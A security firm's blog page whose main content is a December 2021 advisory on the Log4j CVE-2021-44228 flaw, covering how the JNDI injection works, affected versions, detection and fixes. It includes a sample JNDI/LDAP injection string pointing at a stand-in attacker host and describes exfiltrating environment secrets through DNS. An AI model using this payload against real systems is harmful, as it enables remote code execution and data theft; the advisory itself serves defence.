* [Telerik UI](https://blog.mindedsecurity.com/search/label/Telerik%20UI)
  (
  1
  )
* [TESTABLE](https://blog.mindedsecurity.com/search/label/TESTABLE)
  (
  1
  )
* [testing](https://blog.mindedsecurity.com/search/label/testing)
  (
  1
  )
* [Threat Modeling](https://blog.mindedsecurity.com/search/label/Threat%20Modeling)
  (
  1
  )
* [twitter](https://blog.mindedsecurity.com/search/label/twitter)
  (
  1
  )
* [UNECE R155](https://blog.mindedsecurity.com/search/label/UNECE%20R155)
  (
  1
  )
* [unzip directory traversal](https://blog.mindedsecurity.com/search/label/unzip%20directory%20traversal)
  (
  1
  )
* [UPnP](https://blog.mindedsecurity.com/search/label/UPnP)
  (
  2
  )
* [validation](https://blog.mindedsecurity.com/search/label/validation)
  (
  1
  )
* [Vulnerabilities statistics](https://blog.mindedsecurity.com/search/label/Vulnerabilities%20statistics)
  (
  1
  )
* [WAF](https://blog.mindedsecurity.com/search/label/WAF)
  (
  1
  )
* [WAPT](https://blog.mindedsecurity.com/search/label/WAPT)
  (
  1
  )
* [Web Application Firewall](https://blog.mindedsecurity.com/search/label/Web%20Application%20Firewall)
  (
  1
  )
* [web architecture security](https://blog.mindedsecurity.com/search/label/web%20architecture%20security)
  (
  1
  )
* [Web Attacks](https://blog.mindedsecurity.com/search/label/Web%20Attacks)
  (
  23
  )
* [web cache](https://blog.mindedsecurity.com/search/label/web%20cache)
  (
  1
  )
* [web injection](https://blog.mindedsecurity.com/search/label/web%20injection)
  (
  4
  )
* [Web Security](https://blog.mindedsecurity.com/search/label/Web%20Security)
  (
  23
  )
* [Windows Phone Security](https://blog.mindedsecurity.com/search/label/Windows%20Phone%20Security)
  (
  1
  )
* [WWeb Security](https://blog.mindedsecurity.com/search/label/WWeb%20Security)
  (
  2
  )
* [zeus p2p](https://blog.mindedsecurity.com/search/label/zeus%20p2p)
  (
  3
  )

## Blog Archive

* [May](https://blog.mindedsecurity.com/2024/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2024/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2024/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2023/10/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2023/06/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2023/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2023/02/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2022/07/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2021/12/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2021/08/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2021/05/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2021/02/)
  (
  1
  )
* [January](https://blog.mindedsecurity.com/2021/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2020/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2020/10/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2020/07/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2020/06/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2020/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2020/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2020/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2020/02/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2019/04/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2018/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2018/09/)
  (
  3
  )
* [July](https://blog.mindedsecurity.com/2018/07/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2018/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2018/04/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2017/11/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2017/06/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2016/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2016/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2015/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2015/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2015/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2015/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2015/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2015/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2015/03/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2015/02/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2014/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2014/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2014/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2013/10/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2013/04/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2013/02/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2012/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2012/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2012/09/)
  (
  4
  )
* [June](https://blog.mindedsecurity.com/2012/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2011/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2011/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2011/08/)
  (
  2
  )
* [July](https://blog.mindedsecurity.com/2011/07/)
  (
  2
  )
* [May](https://blog.mindedsecurity.com/2011/05/)
  (
  2
  )
* [April](https://blog.mindedsecurity.com/2011/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2011/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2010/10/)
  (
  8
  )
* [September](https://blog.mindedsecurity.com/2010/09/)
  (
  3
  )
* [August](https://blog.mindedsecurity.com/2010/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2010/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2010/04/)
  (
  4
  )
* [March](https://blog.mindedsecurity.com/2010/03/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2009/12/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2009/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2009/10/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2009/05/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2009/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2009/01/)
  (
  1
  )

####

Minded Security was established in Italy in 2007

with a focus on supporting businesses and

organizations to build secure products
 and services.

##### Services

* Training
* Testing
* Consulting
* Request a brochure

##### Information

* The Company
* blueclosure
* AMT – Banking Malware Detector
* Contact us
* Privacy Policy

##### Newsletter

©2015 Minded Security S.r.l. The Software Security Company - VAT IT05756380480

[Back to top](#top)



=== Content from blog.mindedsecurity.com_a6db6102_20250126_020847.html ===


[Subscribe our newsletter](https://mindedsecurity.com/newsletter)

[Minded Security](https://mindedsecurity.com)

* Industry
  + [Automotive/Maritime](https://mindedsecurity.com/industry/automotive-maritime/ "Automotive/Maritime")
  + [Financial](https://mindedsecurity.com/industry/financial/ "Financial")
  + [GDO](https://mindedsecurity.com/industry/gdo/ "GDO")
  + [Industrial Control Systems](https://mindedsecurity.com/industry/industrial-control-systems/ "Industrial Control Systems")
  + [IoT Security](https://mindedsecurity.com/industry/iot-security/ "IoT Security")
  + [Healthcare](https://mindedsecurity.com/industry/healthcare/ "Healthcare")
  + [Government](https://mindedsecurity.com/industry/government/ "Government")
* [Services](https://mindedsecurity.com/our-services/ "Services")
  + [Training](https://mindedsecurity.com/our-services/training/ "Training")
    - [Security Hackaton](https://mindedsecurity.com/services/training/security-hackaton/ "Security Hackaton")
    - [Advanced On-site Training](https://mindedsecurity.com/services/training/advanced-on-site-training/ "Advanced On-site Training")
    - [BlueClosure Training](https://mindedsecurity.com/services/training/blueclosure-training/ "BlueClosure Training")
    - [High Level Training](https://mindedsecurity.com/services/training/high-level-training/ "High Level Training")
    - [Webinar](https://mindedsecurity.com/services/training/webinar/ "Webinar")
  + [Testing](https://mindedsecurity.com/our-services/testing/ "Testing")
    - [Manual Secure Code Review](https://mindedsecurity.com/services/testing/manual-secure-code-review/ "Manual Secure Code Review")
    - [Manual WAPT](https://mindedsecurity.com/services/testing/manual-wapt/ "Manual WAPT")
    - [Cloud Security Testing](https://mindedsecurity.com/services/testing/cloud-security-testing/ "Cloud Security Testing")
    - [IoT Security](https://mindedsecurity.com/services/testing/iot-security/ "IoT Security")
    - [API Security](https://mindedsecurity.com/services/testing/api-security/ "API Security")
    - [Mobile Security Assessment](https://mindedsecurity.com/services/testing/mobile-security-assessment/ "Mobile Security Assessment")
    - [Client Side Assessment](https://mindedsecurity.com/services/testing/client-side-assessment/ "Client Side Assessment")
  + [Consulting](https://mindedsecurity.com/our-services/consulting/ "Consulting")
    - [Software Security Advisory](https://mindedsecurity.com/services/consulting/software-security-advisory/ "Software Security Advisory")
    - [5D Framework](https://mindedsecurity.com/services/consulting/5d-framework/ "5D Framework")
    - [Threat Modeling](https://mindedsecurity.com/services/consulting/threat-modeling/ "Threat Modeling")
    - [Secure Design](https://mindedsecurity.com/services/consulting/secure-design/ "Secure Design")
    - [Secure Architecture Review](https://mindedsecurity.com/services/consulting/secure-architecture-review/ "Secure Architecture Review")
    - [Secure Coding Guidelines](https://mindedsecurity.com/services/consulting/secure-coding-guidelines/ "Secure Coding Guidelines")
    - [Fixing Support](https://mindedsecurity.com/services/consulting/fixing-support/ "Fixing Support")
    - [Outsourcing Development Governance](https://mindedsecurity.com/services/consulting/outsourcing-development-governance/ "Outsourcing Development Governance")
  + [Request a brochure](https://mindedsecurity.com/request-a-brochure/ "Request a brochure")
* Resources
  + [Blog](https://blog.mindedsecurity.com/ "Blog")
  + [News](https://mindedsecurity.com/category/news/ "News")
  + [Videos](https://mindedsecurity.com/videos/ "Videos")
  + [Research](https://mindedsecurity.com/research/ "Research")
  + [Advisories](https://mindedsecurity.com/research/advisories/ "Advisories")
* [About us](https://mindedsecurity.com/our-mission/ "About us")
  + [The Company](https://mindedsecurity.com/the-company/ "The Company")
  + [Contact us](https://mindedsecurity.com/contact-us/ "Contact us")
  + [Newsletter](https://mindedsecurity.com/newsletter/ "Newsletter")
  + [Jobs](https://mindedsecurity.com/jobs/ "Jobs")
  + [Privacy Policy](https://mindedsecurity.com/privacy-policy/ "Privacy Policy")

## IMQ Minded Security Blog

[skip to main](#main)  |
[skip to sidebar](#sidebar)

Showing posts with label **CVE-2021-44228**. [Show all posts](https://blog.mindedsecurity.com/)

Showing posts with label **CVE-2021-44228**. [Show all posts](https://blog.mindedsecurity.com/)

## Tuesday, December 14, 2021

# [The Worst Log Injection. Ever. (Log4j [2.0.0-alpha,2.14.1] )](https://blog.mindedsecurity.com/2021/12/the-worst-log-injection-ever-log4j-200.html)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPZ_5pfkS1cqvswDQyDQPApPaJuMKVDynjevtlYpB5lb-d1hGSsI-_XWxLlDnojb1ShTL7q1gwDRLKjVrjet9moWUyVAUCN1UXWIsp-7wFhgHqVd5EeUQ7oPVPwzLRWpK8319Wq5216Q4/)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPZ_5pfkS1cqvswDQyDQPApPaJuMKVDynjevtlYpB5lb-d1hGSsI-_XWxLlDnojb1ShTL7q1gwDRLKjVrjet9moWUyVAUCN1UXWIsp-7wFhgHqVd5EeUQ7oPVPwzLRWpK8319Wq5216Q4/)There has been such a [hype](https://twitter.com/search?q=%23log4shell) about the Log4j issue and since [IMQ Minded Security](http://mindedsecurity.com/) mission has always been about fixing, this informal post is about *what's going on*, *how to check* if someone's system is likely affected and *how to fix the issue*.

**UPDATE 12-17-2021**: Since several bypasses to the mitigations implemented on version 2.15/16 were found, **be sure to update to****Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later) as described [here](https://logging.apache.org/log4j/2.x/security.html) and [here](https://logging.apache.org/log4j/2.x/) ASAP!**
### **What's the Buzz? (The Problem)**

On Thursday 12/09/2021 a [vulnerability](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228) affecting a very popular logging Java library was published on [Github](https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce). A few hours later the infosec community [was](https://www.lunasec.io/docs/blog/log4j-zero-day/) [on fire](https://twitter.com/search?q=%23log4shell).
The issue falls in the category of *[Template Language Injection](https://cwe.mitre.org/data/definitions/1336.html)*, which involves a parser that is triggered to perform certain actions when particular sequences are found in the parsed string.
The library is [Log4j](https://logging.apache.org/log4j/2.x/) and the vulnerable methods (sinks) are the ones that are usually called to actually log messages in files to keep track of events happening during the execution of an application:

> * log
> * fatal
> * error
> * warn
> * trace
> * ..

(for a more technical code insight <https://y4y.space/2021/12/10/log4j-analysis-more-jndi-injection/>).
It means that, if the application wants to log some dynamic content coming from an external source, such as, *a message about an error login* from a non existing username, it might call something like:
> logger.warn(username + " not found!");

If the username value is controlled by a malicious user it will be possible to exploit the vulnerability and even execute arbitrary code on the affected platform.
In particular, if an attacker is able to control the log message string, even partially, and he is able to inject the '***${***' and '***}***' metacharacters the Log4j I[nterpolator](https://github.com/apache/logging-log4j2/blob/master/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.java) will parse the content and look for [specific patterns](https://github.com/apache/logging-log4j2/blob/master/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.java#L103).
According to the Interceptor class the following patterns are enabled by default:
> - log4j
> - sys
> - env
> - main
> - marker
> - java
> - lower
> - upper
> - date
> - ctx
> - jndi (if org.apache.logging.log4j.core.lookup.JndiLookup is present)
> - web (if org.apache.logging.log4j.web.WebLookup is present)
> - docker
> - spring
> - kubernetes

So, the real deal is about an attack that can be performed via JNDI:LDAP keyword (or similar patterns such as RMI, COS etc..). In fact by injecting something like:
> ${jndi:ldap://EVILLDAP:[PORT]/XX}

as argument in the sink method, Log4j will:

1. trigger a DNS request to check if the EVILLDAP hostname needs to be resolved
2. perform an LDAP request to the (attacker controlled) LDAP server hosted on the resolved IP
3. the attacker controlled LDAP server will then be able to reply with a malicious serialized Java object, which will be executed on the Log4j side.
4. if the malicious object, by abusing internal features (gadgets), is able to trigger the correct set of instruction, the vulnerability will be successfully exploited.

As can be noted, **this is a two stages attack,** in fact, after the vulnerability is triggered, the vulnerable application needs to send a request to the malicious server in order to get the RCE payload.
### **What's the Impact and How about the Risk? (****The Attack)**

The worst **impact** is the *Remote Code Execution*, which requires:

1. *the victim machine must be able to perform outbound requests*
2. *the attacker must be able to use the correct gadget chain to successfully perform the attack.*

 Another important **impact** involves *Exfiltration of Confidential Information* via other pattern such as:

> * env:KEY
> * sys:KEY
> * ctx:KEY
> * web:KEY
> * ..

In conjunction with DNS Requests or other layer 7 requests.Which requires that:

1. the victim machine is allowed to perform DNS requests or perform outbound requests

In this second attack the attacker will be able to gather information such as internal cryptography keys or similar data from application mapped strings.

### **Which Version is Affected?**

All version of *Apache Log4j 2 until 2.15 excluded* are affected.

In particular: **2.0-beta9 <= Apache Log4j <= 2.14.1**Log4j version 1 might be affected in some specific case if JNDI is enabled, but it is not by default.
**WARNING**: there is a bunch of blog posts asserting that **some Java version mitigates** the attacks, but that is **NOT true**.**The vulnerability is independent on the Java version.**
### **Am I Vulnerable? (The Check)**

There are several ways to check if some of the deployed application is vulnerable...the correct answer would be implement [Supply Chain Management](https://en.wikipedia.org/wiki/Supply_chain_management), but this paragraph is for practical, urgent actions.

If you've already implemented a process which allows to list:

* \***All**\* your applications and versions
* \***Where**\* they are deployed

That list is called [SBOM (Software Bill of Materials)](https://en.wikipedia.org/wiki/Software_bill_of_materials) which list of all the used software, libraries included and their versions.
If you have it, there are very good chances that the time spent to find & fix everything will be relatively small.

But, of course, having it depends on the maturity of the security process implemented in your company (check [this](https://mindedsecurity.com/services/consulting/5d-framework/) out if you're interested in our [services](https://mindedsecurity.com/our-services/consulting/)).

Consider an enterprise without a SBOM. They might have hundreds of deployed software from external vendors and internally developed custom software. Meaning it will require a big effort of time and resources to prioritize and patch.

If *no SBOM is in place* then, the first thing to do is to roll up your sleeves and *for each instance*:

> 1. Login
> 2. Check if there are running processes using java.
> 3. Identify the directories and use the open source [OWASP Dependency Check](https://github.com/jeremylong/DependencyCheck/releases/) (or similar products).

*OWASP Dependency Check* is able to recursively check for vulnerable libraries in a EAR/WAR/JAR deployed applications and also other files like *POM.xml*.
Finally, have a look at the [Indicator Of Compromise](https://github.com/curated-intel/Log4Shell-IOCs) list that might help in case there's already been a security incident.

### How can I mitigate the risk? (The Fix)

**The permanent ones**:

* For [each](https://www.ibm.com/blogs/psirt/an-update-on-the-apache-log4j-cve-2021-44228-vulnerability/) [affected](https://twitter.com/GossiTheDog/status/1470056396968374273/photo/1) [vendor](https://github.com/NCSC-NL/log4shell/tree/main/software) you should ping them, asking for a patch or minor release. If they tell you that you must update to a major release and your product is not EOL, you should insist for a minor/patch level release which addresses the vulnerability.
* For each internal application update Log4j library to version **2.16**.

+ WARNING: Log4j **2.16** requires Java 8, so if you have Java < 8 there might be some more time consuming effort. In that case see if the following workaround is worth trying.

**The workarounds:**

* if **Log4j version >= 2.10**, [as explained here](https://logging.apache.org/log4j/2.x/security.html), you can do the following steps:

1. export the following ENVIRONMENT VARIABLE to the whole OS as LOG4J\_FORMAT\_MSG\_NO\_LOOKUPS=true
2. relaunch the application.
3. Check if you're still vulnerable with a POC.

* For each affected machine:

+ if **it's not supposed** to generate egress traffic **block** DNS requests and new outbound traffic.
+ if **it's supposed** to generate outbound traffic, well...that falls into **anomaly detection** category, which could help but be sure that it is not a fingerprint based one since there's a [lot](https://twitter.com/Rezn0k/status/1469523006015750146) of [ways](https://github.com/woodpecker-appstore/log4j-payload-generator) to bypass blocking rules.
+ last but not least it might be interesting to experiment some kind of RASP, [such as this one](https://github.com/corretto/hotpatch-for-apache-log4j2), which will be able to identify contextual traffic without the risk of bypasses.

Here's a nice InfoGraphics about the attack flow and the points of mitigation from [GovCert.CH](https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/):
###

### Conclusions

This post was written in order to give some clarification about the CVE-2021-44228 and to give some thoughtful information regarding attacks, checks and fixes. Please comment/email us if you need more clarifications.

By

[Stefano Di Paola](https://www.blogger.com/profile/11966634329749157589 "author profile")

at

[5:47 AM](https://blog.mindedsecurity.com/2021/12/the-worst-log-injection-ever-log4j-200.html "permanent link")

[No comments
:](https://blog.mindedsecurity.com/2021/12/the-worst-log-injection-ever-log4j-200.html#comment-form)

[![](//img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7122745763234660283&postID=2016543162321465219&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=2016543162321465219&target=email "Email This")
[BlogThis!](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=2016543162321465219&target=blog "BlogThis!")
[Share to X](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=2016543162321465219&target=twitter "Share to X")
[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=2016543162321465219&target=facebook "Share to Facebook")
[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=2016543162321465219&target=pinterest "Share to Pinterest")

Labels:
[appsec](https://blog.mindedsecurity.com/search/label/appsec)
,
[CVE-2021-44228](https://blog.mindedsecurity.com/search/label/CVE-2021-44228)
,
[fixing](https://blog.mindedsecurity.com/search/label/fixing)
,
[Log4J](https://blog.mindedsecurity.com/search/label/Log4J)

[Older Posts](https://blog.mindedsecurity.com/search/label/CVE-2021-44228?updated-max=2021-12-14T05:47:00-08:00&max-results=20&start=20&by-date=false "Older Posts")

[Home](https://blog.mindedsecurity.com/)

Subscribe to:
[Posts
(
Atom
)](https://blog.mindedsecurity.com/feeds/posts/default)

##

## Labels

* [3rd party javascript](https://blog.mindedsecurity.com/search/label/3rd%20party%20javascript)
  (
  2
  )
* [absolute path check](https://blog.mindedsecurity.com/search/label/absolute%20path%20check)
  (
  1
  )
* [Adobe](https://blog.mindedsecurity.com/search/label/Adobe)
  (
  3
  )
* [Advisory](https://blog.mindedsecurity.com/search/label/Advisory)
  (
  5
  )
* [adware](https://blog.mindedsecurity.com/search/label/adware)
  (
  1
  )
* [AFNetworking](https://blog.mindedsecurity.com/search/label/AFNetworking)
  (
  1
  )
* [agile](https://blog.mindedsecurity.com/search/label/agile)
  (
  1
  )
* [AMT](https://blog.mindedsecurity.com/search/label/AMT)
  (
  1
  )
* [Android](https://blog.mindedsecurity.com/search/label/Android)
  (
  1
  )
* [Android Security](https://blog.mindedsecurity.com/search/label/Android%20Security)
  (
  6
  )
* [Anti-Tampering](https://blog.mindedsecurity.com/search/label/Anti-Tampering)
  (
  2
  )
* [Antitamper](https://blog.mindedsecurity.com/search/label/Antitamper)
  (
  2
  )
* [Applet Security](https://blog.mindedsecurity.com/search/label/Applet%20Security)
  (
  6
  )
* [Application Security](https://blog.mindedsecurity.com/search/label/Application%20Security)
  (
  23
  )
* [appsec](https://blog.mindedsecurity.com/search/label/appsec)
  (
  1
  )
* [Arbitrary Code Execution](https://blog.mindedsecurity.com/search/label/Arbitrary%20Code%20Execution)
  (
  4
  )
* [architecture](https://blog.mindedsecurity.com/search/label/architecture)
  (
  1
  )
* [asp.net](https://blog.mindedsecurity.com/search/label/asp.net)
  (
  2
  )
* [ast](https://blog.mindedsecurity.com/search/label/ast)
  (
  1
  )
* [attacks](https://blog.mindedsecurity.com/search/label/attacks)
  (
  1
  )
* [Authentication](https://blog.mindedsecurity.com/search/label/Authentication)
  (
  1
  )
* [Autoloaded File Inclusion](https://blog.mindedsecurity.com/search/label/Autoloaded%20File%20Inclusion)
  (
  1
  )
* [Automotive](https://blog.mindedsecurity.com/search/label/Automotive)
  (
  1
  )
* [Banking](https://blog.mindedsecurity.com/search/label/Banking)
  (
  4
  )
* [Banking Malware](https://blog.mindedsecurity.com/search/label/Banking%20Malware)
  (
  1
  )
* [blackbox](https://blog.mindedsecurity.com/search/label/blackbox)
  (
  1
  )
* [blueclosure](https://blog.mindedsecurity.com/search/label/blueclosure)
  (
  1
  )
* [burp](https://blog.mindedsecurity.com/search/label/burp)
  (
  1
  )
* [canonicalization](https://blog.mindedsecurity.com/search/label/canonicalization)
  (
  1
  )
* [Certificate Pinning](https://blog.mindedsecurity.com/search/label/Certificate%20Pinning)
  (
  1
  )
* [chat](https://blog.mindedsecurity.com/search/label/chat)
  (
  1
  )
* [Client Side HTTP Parameter Pollution](https://blog.mindedsecurity.com/search/label/Client%20Side%20HTTP%20Parameter%20Pollution)
  (
  1
  )
* [cloud](https://blog.mindedsecurity.com/search/label/cloud)
  (
  1
  )
* [cloud browsing](https://blog.mindedsecurity.com/search/label/cloud%20browsing)
  (
  1
  )
* [Code Protection](https://blog.mindedsecurity.com/search/label/Code%20Protection)
  (
  2
  )
* [compliance](https://blog.mindedsecurity.com/search/label/compliance)
  (
  1
  )
* [Concrete5](https://blog.mindedsecurity.com/search/label/Concrete5)
  (
  1
  )
* [Content Security Policy](https://blog.mindedsecurity.com/search/label/Content%20Security%20Policy)
  (
  1
  )
* [CORS](https://blog.mindedsecurity.com/search/label/CORS)
  (
  1
  )
* [Cross Site Scripting](https://blog.mindedsecurity.com/search/label/Cross%20Site%20Scripting)
  (
  7
  )
* [CVE-2015-6497](https://blog.mindedsecurity.com/search/label/CVE-2015-6497)
  (
  1
  )
* CVE-2021-44228

  (
  1
  )
* [DAB](https://blog.mindedsecurity.com/search/label/DAB)
  (
  1
  )
* [defense](https://blog.mindedsecurity.com/search/label/defense)
  (
  1
  )
* [deobfuscation](https://blog.mindedsecurity.com/search/label/deobfuscation)
  (
  2
  )
* [DeviceSecurity](https://blog.mindedsecurity.com/search/label/DeviceSecurity)
  (
  2
  )
* [DEVSECOPS](https://blog.mindedsecurity.com/search/label/DEVSECOPS)
  (
  1
  )
* [dll](https://blog.mindedsecurity.com/search/label/dll)
  (
  1
  )
* [DNS Rebinding](https://blog.mindedsecurity.com/search/label/DNS%20Rebinding)
  (
  2
  )
* [DOM Based XSS](https://blog.mindedsecurity.com/search/label/DOM%20Based%20XSS)
  (
  9
  )
* [Dom Xss](https://blog.mindedsecurity.com/search/label/Dom%20Xss)
  (
  15
  )
* [DOMinator](https://blog.mindedsecurity.com/search/label/DOMinator)
  (
  11
  )
* [DOMinatorPro](https://blog.mindedsecurity.com/search/label/DOMinatorPro)
  (
  9
  )
* [download](https://blog.mindedsecurity.com/search/label/download)
  (
  1
  )
* [Dyre](https://blog.mindedsecurity.com/search/label/Dyre)
  (
  1
  )
* [Encryption](https://blog.mindedsecurity.com/search/label/Encryption)
  (
  3
  )
* [Expression Language Injection](https://blog.mindedsecurity.com/search/label/Expression%20Language%20Injection)
  (
  3
  )
* [fixing](https://blog.mindedsecurity.com/search/label/fixing)
  (
  1
  )
* [Flex](https://blog.mindedsecurity.com/search/label/Flex)
  (
  2
  )
* [Flutter](https://blog.mindedsecurity.com/search/label/Flutter)
  (
  1
  )
* [gameover](https://blog.mindedsecurity.com/search/label/gameover)
  (
  1
  )
* [Google Plus One](https://blog.mindedsecurity.com/search/label/Google%20Plus%20One)
  (
  1
  )
* [google security](https://blog.mindedsecurity.com/search/label/google%20security)
  (
  1
  )
* [Http Parameter Pollution](https://blog.mindedsecurity.com/search/label/Http%20Parameter%20Pollution)
  (
  2
  )
* [Http Request Splitting](https://blog.mindedsecurity.com/search/label/Http%20Request%20Splitting)
  (
  1
  )
* [Information Disclosure](https://blog.mindedsecurity.com/search/label/Information%20Disclosure)
  (
  2
  )
* [innovation](https://blog.mindedsecurity.com/search/label/innovation)
  (
  2
  )
* [intruder](https://blog.mindedsecurity.com/search/label/intruder)
  (
  1
  )
* [iOS](https://blog.mindedsecurity.com/search/label/iOS)
  (
  2
  )
* [iOS Security](https://blog.mindedsecurity.com/search/label/iOS%20Security)
  (
  7
  )
* [IoT](https://blog.mindedsecurity.com/search/label/IoT)
  (
  2
  )
* [ISO21434](https://blog.mindedsecurity.com/search/label/ISO21434)
  (
  1
  )
* [J2EE](https://blog.mindedsecurity.com/search/label/J2EE)
  (
  1
  )
* [Java](https://blog.mindedsecurity.com/search/label/Java)
  (
  5
  )
* [Java Faces](https://blog.mindedsecurity.com/search/label/Java%20Faces)
  (
  1
  )
* [Java Security](https://blog.mindedsecurity.com/search/label/Java%20Security)
  (
  2
  )
* [javascript](https://blog.mindedsecurity.com/search/label/javascript)
  (
  4
  )
* [JavaScript Security](https://blog.mindedsecurity.com/search/label/JavaScript%20Security)
  (
  2
  )
* [JNLP Security](https://blog.mindedsecurity.com/search/label/JNLP%20Security)
  (
  1
  )
* [jQuery](https://blog.mindedsecurity.com/search/label/jQuery)
  (
  2
  )
* [JSON](https://blog.mindedsecurity.com/search/label/JSON)
  (
  1
  )
* [Libraries Security](https://blog.mindedsecurity.com/search/label/Libraries%20Security)
  (
  1
  )
* [Liferay](https://blog.mindedsecurity.com/search/label/Liferay)
  (
  1
  )
* [Linkedin.com](https://blog.mindedsecurity.com/search/label/Linkedin.com)
  (
  1
  )
* [Log4J](https://blog.mindedsecurity.com/search/label/Log4J)
  (
  1
  )
* [Magento](https://blog.mindedsecurity.com/search/label/Magento)
  (
  1
  )
* [malware](https://blog.mindedsecurity.com/search/label/malware)
  (
  9
  )
* [malware detector](https://blog.mindedsecurity.com/search/label/malware%20detector)
  (
  1
  )
* [MAPT](https://blog.mindedsecurity.com/search/label/MAPT)
  (
  4
  )
* [maxthon](https://blog.mindedsecurity.com/search/label/maxthon)
  (
  1
  )
* [microservices](https://blog.mindedsecurity.com/search/label/microservices)
  (
  1
  )
* [MitM](https://blog.mindedsecurity.com/search/label/MitM)
  (
  2
  )
* [Mobile](https://blog.mindedsecurity.com/search/label/Mobile)
  (
  5
  )
* [Mobile Security](https://blog.mindedsecurity.com/search/label/Mobile%20Security)
  (
  4
  )
* [MSTG](https://blog.mindedsecurity.com/search/label/MSTG)
  (
  3
  )
* [mvc](https://blog.mindedsecurity.com/search/label/mvc)
  (
  1
  )
* [Obfuscation](https://blog.mindedsecurity.com/search/label/Obfuscation)
  (
  3
  )
* [Omniture](https://blog.mindedsecurity.com/search/label/Omniture)
  (
  2
  )
* [Oracle NetBeans](https://blog.mindedsecurity.com/search/label/Oracle%20NetBeans)
  (
  1
  )
* [OWASP](https://blog.mindedsecurity.com/search/label/OWASP)
  (
  6
  )
* [OWASP 5D](https://blog.mindedsecurity.com/search/label/OWASP%205D)
  (
  2
  )
* [OWASP SAMM](https://blog.mindedsecurity.com/search/label/OWASP%20SAMM)
  (
  2
  )
* [OWASP Summit](https://blog.mindedsecurity.com/search/label/OWASP%20Summit)
  (
  1
  )
* [OWASP Top Ten](https://blog.mindedsecurity.com/search/label/OWASP%20Top%20Ten)
  (
  3
  )
* [p2p encryption](https://blog.mindedsecurity.com/search/label/p2p%20encryption)
  (
  1
  )
* [path traversal](https://blog.mindedsecurity.com/search/label/path%20traversal)
  (
  3
  )
* [peer to peer encryption](https://blog.mindedsecurity.com/search/label/peer%20to%20peer%20encryption)
  (
  1
  )
* [Polyglots](https://blog.mindedsecurity.com/search/label/Polyglots)
  (
  1
  )
* [Primefaces](https://blog.mindedsecurity.com/search/label/Primefaces)
  (
  1
  )
* [privacy](https://blog.mindedsecurity.com/search/label/privacy)
  (
  1
  )
